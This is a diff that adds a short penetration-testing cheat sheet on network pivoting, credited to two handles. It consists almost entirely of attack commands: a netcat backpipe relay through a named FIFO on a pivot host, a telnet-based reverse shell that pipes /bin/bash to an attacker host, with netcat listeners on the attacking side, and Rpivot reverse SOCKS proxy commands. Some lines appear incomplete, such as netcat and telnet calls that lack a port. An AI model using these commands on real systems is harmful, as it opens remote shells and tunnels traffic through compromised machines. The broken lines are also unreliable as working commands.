@@ -1,0 +1,30 @@
+# alex <alexbujduveanu>
+#snifer <sniferl4bs>
+
+# To make a FIFO in the file system 
+mknod [name of file] p
+
+# Pivoting with a backpipe #
+# On the attacker:
+nc [pivot host]
+
+# On the pivot host
+nc localhost 80 <[FIFO file name] | nc -l -p 4444 >[FIFO file name]
+
+# Telnet variant (when netcat is not available on the target) #
+# Listen on port 80 in terminal 1 on the attack machine
+nc -l -n -v -p 80 
+
+# Listen on port 443 in terminal 2 on the attack machine
+nc -l -n -v -p 443
+
+# On the target machine:
+telnet [attack host] 80 | /bin/bash | telnet [attack host]
+
+#Rpivot is a reverse socks proxy tool that allows you to tunnel traffic via socks proxy
+#Server side
+python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
+
+#Client side
+python client.py --server-ip <ip> --server-port 9999
+
